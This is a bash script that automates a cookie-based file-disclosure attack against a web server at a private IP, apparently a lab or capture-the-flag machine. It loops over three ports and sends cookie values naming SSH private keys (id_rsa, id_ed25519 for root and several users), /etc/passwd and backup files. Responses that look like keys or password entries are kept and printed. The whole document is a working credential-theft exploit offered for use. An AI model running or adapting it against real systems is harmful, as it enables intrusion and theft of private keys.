# Automated cookie-file-disclosure checks
# Run this script (save as check_files.sh, chmod +x check_files.sh, then ./check_files.sh). 
# It tries several likely paths across common ports (8765, 8764, 80) and saves any responses that look like private keys or interesting text.

#!/bin/bash
HOST="10.201.63.19"
PORTS=(8765 8764 80)
# candidate files to try (add more as you think of them)
FILES=(
  "/home/barry/.ssh/id_rsa"
  "/home/barry/.ssh/id_ed25519"
  "/home/admin/.ssh/id_rsa"
  "/home/admin/.ssh/id_ed25519"
  "/root/.ssh/id_rsa"
  "/root/.ssh/id_ed25519"
  "/home/joe/.ssh/id_rsa"
  "/etc/passwd"
  "/var/www/html/auth/dontforget.bak"
  "/var/www/html/users.bak"
  "/auth/dontforget.bak"
  "/users.bak"
)

mkdir -p responses

for p in "${PORTS[@]}"; do
  for f in "${FILES[@]}"; do
    cookie="Example=${f}"
    out="responses/out_port${p}_$(echo ${f} | sed 's/\//_/g' | sed 's/^_//').txt"
    echo "[*] Trying http://${HOST}:${p} with cookie: ${cookie}"
    curl -s -b "${cookie}" "http://${HOST}:${p}/" -o "${out}"
    # quick check for likely interesting content
    if grep -q -E "BEGIN (RSA|OPENSSH) PRIVATE KEY|PRIVATE KEY|root:|/home/" "${out}"; then
      echo "[+] Potential sensitive file saved: ${out}"
      # show a short preview
      echo "----- preview -----"
      sed -n '1,120p' "${out}"
      echo "-------------------"
    else
      rm -f "${out}"    # remove noise
    fi
  done
done

echo "[*] Done. Check responses/ for saved outputs."
